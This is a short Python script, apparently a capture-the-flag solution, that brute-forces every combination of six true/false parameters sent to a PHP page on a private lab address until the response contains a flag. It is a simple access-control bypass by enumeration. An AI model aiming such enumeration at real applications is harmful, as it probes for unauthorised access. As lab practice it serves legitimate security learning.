import itertools
import requests

# Replace this URL with the actual URL for the script
script_url = "http://10.0.0.6/ctf_deploy/aclive/ddjS7HkE9M/A.php"

# List of attributes and their possible values
attributes = {
    'OSA': ['True', 'False'],
    'OSB': ['True', 'False'],
    'OSC': ['True', 'False'],
    'HSA': ['True', 'False'],
    'HSB': ['True', 'False'],
    'HSD': ['True', 'False'],
}

# Generate all possible combinations of attribute values
combinations = list(itertools.product(*attributes.values()))

# Iterate through each combination and make a request to the script
for combo in combinations:
    # Create a dictionary with attribute names and values
    params = dict(zip(attributes.keys(), combo))

    # Make a request to the script with the current combination
    response = requests.get(script_url, params=params)

    # Check if the response contains the flag
    if 'flag' in response.text:
        print(f"Flag found with attributes: {params}")
        print("Response:", response.text)
        break
    else:
        print(f"Attempted attributes: {params}, Result: {response.text}")
